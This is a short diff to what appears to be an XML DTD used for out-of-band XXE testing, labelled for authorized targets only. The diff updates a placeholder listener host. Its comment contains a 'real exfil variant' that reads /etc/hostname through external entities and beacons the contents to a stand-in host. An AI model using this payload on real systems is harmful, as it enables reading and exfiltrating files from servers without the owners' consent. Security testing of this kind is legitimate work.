@@ -5,13 +5,13 @@
      reference to the non-resolvable placeholder host - the only network
      attempt is a DNS lookup for *.example.invalid which never resolves.
 
-     WHAT TO EDIT: replace YOUR-OOB-HOST.example.invalid (2x) with your
+     WHAT TO EDIT: replace YOUR-OOB-HOST.example.invalid (3x) with your
      listener domain.
 
      REAL EXFIL VARIANT (authorized targets only) - read a local file and
      beacon it back:
        <!ENTITY % file SYSTEM "file:///etc/hostname">
-       <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://xxe2.YOUR-OOB-HOST/?d=%file;'>">
+       <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://xxe2.YOUR-OOB-HOST.example.invalid/?d=%file;'>">
        %eval;
      (the &#x25; is the encoded % so the inner entity is built at runtime) -->
 <!ENTITY % file "benign-local-placeholder">
